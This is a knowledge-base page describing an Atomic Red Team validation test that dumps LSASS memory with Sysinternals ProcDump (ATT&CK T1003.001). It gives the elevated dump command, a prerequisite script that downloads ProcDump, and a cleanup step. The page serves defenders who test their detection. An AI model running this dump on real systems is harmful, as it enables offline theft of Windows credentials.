---
atomic_guid: "7cede33f-0acd-44ef-9774-15511300b24b"
title: "Create Mini Dump of LSASS.exe using ProcDump"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "7cede33f-0acd-44ef-9774-15511300b24b"
  - "Create Mini Dump of LSASS.exe using ProcDump"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Create Mini Dump of LSASS.exe using ProcDump

The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.

## Metadata

- Atomic GUID: 7cede33f-0acd-44ef-9774-15511300b24b
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Input Arguments

### output_file

- description: Path where resulting dump should be placed
- type: path
- default: C:\Windows\Temp\lsass_dump.dmp

### procdump_exe

- description: Path of Procdump executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe

## Dependencies

ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})

### Prerequisite Check

```text
if (Test-Path "#{procdump_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -Force
New-Item -ItemType Directory (Split-Path "#{procdump_exe}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe" "#{procdump_exe}" -Force
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
"#{procdump_exe}" -accepteula -mm lsass.exe #{output_file}
```

### Cleanup

```commandprompt
del "#{output_file}" >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
